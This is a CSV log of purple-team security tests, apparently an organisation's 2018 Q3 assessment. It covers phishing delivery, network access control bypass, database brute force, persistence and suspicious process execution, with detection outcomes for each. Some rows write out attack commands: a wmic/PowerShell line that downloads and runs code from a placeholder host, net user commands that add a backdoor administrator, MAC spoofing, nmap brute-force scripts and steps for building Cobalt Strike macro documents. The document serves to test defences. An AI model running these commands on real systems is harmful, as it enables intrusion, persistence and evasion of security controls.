Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T23:15:22.717Z,1533856522717,2018-08-09T23:33:43.717Z,1533857623717,2018-08-10T00:51:37.717Z,1533862297717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T13:39:41.717Z,1533821981717,2018-08-09T14:25:49.717Z,1533824749717,2018-08-09T15:30:35.717Z,1533828635717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,20 - Link - Password-protected Office Doc - Standard CS payload,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-10T02:11:03.717Z,1533867063717,2018-08-10T03:54:43.717Z,1533873283717,2018-08-10T04:04:42.717Z,1533873882717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,4 - Link - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T09:07:24.717Z,1533719244717,2018-08-08T09:35:18.717Z,1533720918717,2018-08-08T10:25:52.717Z,1533723952717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,15 - Link - Archive - Macro,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-09T04:31:12.717Z,1533789072717,2018-08-09T05:58:30.717Z,1533794310717,2018-08-09T06:36:50.717Z,1533796610717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,6 - Link - Macro - WScript EXE,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-08T12:55:37.717Z,1533732937717,2018-08-08T13:20:48.717Z,1533734448717,2018-08-08T14:55:37.717Z,1533740137717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-10T04:32:12.717Z,1533875532717,2018-08-10T05:48:25.717Z,1533880105717,2018-08-10T07:47:58.717Z,1533887278717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,22 - Link - Link Inside Office Document,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-10T07:51:29.717Z,1533887489717,2018-08-10T09:08:26.717Z,1533892106717,2018-08-10T11:03:02.717Z,1533898982717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,16 - Link - Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T16:51:35.717Z,1533833495717,2018-08-09T17:37:33.717Z,1533836253717,2018-08-09T19:22:41.717Z,1533842561717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,5 - Link - Macro - WScript PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-08T10:47:15.717Z,1533725235717,2018-08-08T10:51:55.717Z,1533725515717,2018-08-08T10:59:38.717Z,1533725978717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,2 - Link - Macro - CobaltStrike Standard (MMG),T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-08T03:09:48.717Z,1533697788717,2018-08-08T04:05:29.717Z,1533701129717,2018-08-08T05:02:29.717Z,1533704549717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,19 - Link - Encrypted Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-10T01:05:31.717Z,1533863131717,2018-08-10T01:23:23.717Z,1533864203717,2018-08-10T02:07:56.717Z,1533866876717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",MUSHA,2018-08-04T20:25:56.717Z,1533414356717,2018-08-04T20:31:01.717Z,1533414661717,2018-08-04T20:37:14.717Z,1533415034717,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2018 Q3,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-08-04T13:41:07.717Z,1533390067717,2018-08-04T14:24:49.717Z,1533392689717,2018-08-04T15:06:54.717Z,1533395214717,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-08-04T16:36:41.717Z,1533400601717,2018-08-04T17:29:12.717Z,1533403752717,2018-08-04T19:03:51.717Z,1533409431717,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",Radiant Silvergun,2018-08-15T14:49:21.717Z,1534344561717,2018-08-15T16:03:20.717Z,1534349000717,2019-01-28T19:05:31.980Z,1548702331980,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-08-15T21:18:32.717Z,1534367912717,2018-08-15T21:23:26.717Z,1534368206717,2019-01-28T19:31:32.842Z,1548703892842,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-08-16T02:56:41.717Z,1534388201717,2018-08-16T04:03:33.717Z,1534392213717,2019-01-28T19:32:53.726Z,1548703973726,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-08-16T06:05:15.717Z,1534399515717,2018-08-16T06:45:38.717Z,1534401938717,2019-01-28T19:32:17.510Z,1548703937510,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,NotDetected,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-08-15T18:35:21.717Z,1534358121717,2018-08-15T20:08:39.717Z,1534363719717,2019-01-29T08:32:44.655Z,1548750764655,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-08-16T01:05:46.717Z,1534381546717,2018-08-16T01:25:27.717Z,1534382727717,2019-01-28T19:31:58.687Z,1548703918687,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,NotDetected,TBD,No,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-08-15T23:13:59.717Z,1534374839717,2018-08-15T23:55:30.717Z,1534377330717,2019-01-29T08:33:04.385Z,1548750784385,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-08-16T08:16:23.717Z,1534407383717,2018-08-16T09:02:24.717Z,1534410144717,2019-01-28T19:05:44.423Z,1548702344423,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-08-19T09:55:16.717Z,1534672516717,2018-08-19T10:19:45.717Z,1534673985717,2018-08-19T11:08:39.717Z,1534676919717,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q3,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Med,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",Batrider,2018-08-18T20:46:53.717Z,1534625213717,2018-08-18T22:04:24.717Z,1534629864717,2019-01-28T19:34:32.163Z,1548704072163,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2018 Q3,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,DLP,,2018-08-19T13:02:42.717Z,1534683762717,2018-08-19T13:35:21.717Z,1534685721717,2018-08-19T14:26:08.717Z,1534688768717,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2018 Q3,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-08-19T03:29:35.717Z,1534649375717,2018-08-19T04:42:30.717Z,1534653750717,2018-08-19T05:16:50.717Z,1534655810717,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q3,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-08-19T06:44:19.717Z,1534661059717,2018-08-19T08:30:20.717Z,1534667420717,2018-08-19T09:08:38.717Z,1534669718717,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2018 Q3,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2018-08-18T23:37:30.717Z,1534635450717,2018-08-19T01:03:35.717Z,1534640615717,2018-08-19T02:20:00.717Z,1534645200717,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2018 Q3,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-08-04T02:09:57.717Z,1533348597717,2018-08-04T04:00:08.717Z,1533355208717,2019-01-28T18:15:48.465Z,1548699348465,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-08-04T06:44:17.717Z,1533365057717,2018-08-04T07:06:46.717Z,1533366406717,2019-01-28T18:16:14.407Z,1548699374407,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2018-08-04T08:57:08.717Z,1533373028717,2018-08-04T09:03:25.717Z,1533373405717,2018-08-04T10:03:29.717Z,1533377009717,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,Detected,High,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",Progear,2018-08-04T10:15:12.717Z,1533377712717,2018-08-04T11:47:39.717Z,1533383259717,2019-01-28T18:16:28.530Z,1548699388530,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-08-14T17:31:11.717Z,1534267871717,2018-08-14T18:53:11.717Z,1534272791717,2018-08-14T19:44:20.717Z,1534275860717,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR,Endpoint Protection",Progear,2018-08-14T19:45:45.717Z,1534275945717,2018-08-14T20:44:09.717Z,1534279449717,2019-01-28T19:04:13.582Z,1548702253582,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-08-14T15:38:16.717Z,1534261096717,2018-08-14T16:05:51.717Z,1534262751717,2018-08-14T17:14:41.717Z,1534266881717,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2018-08-14T22:36:36.717Z,1534286196717,2018-08-15T00:19:21.717Z,1534292361717,2019-01-28T19:04:33.528Z,1548702273528,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR,Endpoint Protection",,2018-08-15T00:39:38.717Z,1534293578717,2018-08-15T02:29:56.717Z,1534300196717,2018-08-15T02:44:13.717Z,1534301053717,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q3,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-14T13:23:32.717Z,1534253012717,2018-08-14T13:25:45.717Z,1534253145717,2019-01-28T19:03:54.021Z,1548702234021,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-13T12:03:56.717Z,1534161836717,2018-08-13T12:05:07.717Z,1534161907717,2019-01-28T19:01:13.237Z,1548702073237,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,Detected,High,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-13T17:18:22.717Z,1534180702717,2018-08-13T17:56:51.717Z,1534183011717,2019-01-29T07:52:47.500Z,1548748367500,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-08-14T09:21:54.717Z,1534238514717,2018-08-14T10:05:42.717Z,1534241142717,2018-08-14T11:45:42.717Z,1534247142717,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-14T05:52:58.717Z,1534225978717,2018-08-14T06:47:45.717Z,1534229265717,2019-01-28T19:03:04.315Z,1548702184315,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2018-08-14T02:17:08.717Z,1534213028717,2018-08-14T03:18:33.717Z,1534216713717,2018-08-14T04:18:49.717Z,1534220329717,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-13T06:53:32.717Z,1534143212717,2018-08-13T08:52:31.717Z,1534150351717,2019-01-28T19:00:56.004Z,1548702056004,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,High,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-08-13T23:05:39.717Z,1534201539717,2018-08-13T23:51:57.717Z,1534204317717,2019-01-28T19:02:45.068Z,1548702165068,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-08-13T03:17:29.717Z,1534130249717,2018-08-13T04:22:53.717Z,1534134173717,2018-08-13T05:38:27.717Z,1534138707717,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-08-13T14:07:32.717Z,1534169252717,2018-08-13T14:56:53.717Z,1534172213717,2018-08-13T16:51:07.717Z,1534179067717,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-08-13T19:59:31.717Z,1534190371717,2018-08-13T20:28:20.717Z,1534192100717,2018-08-13T21:46:05.717Z,1534196765717,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
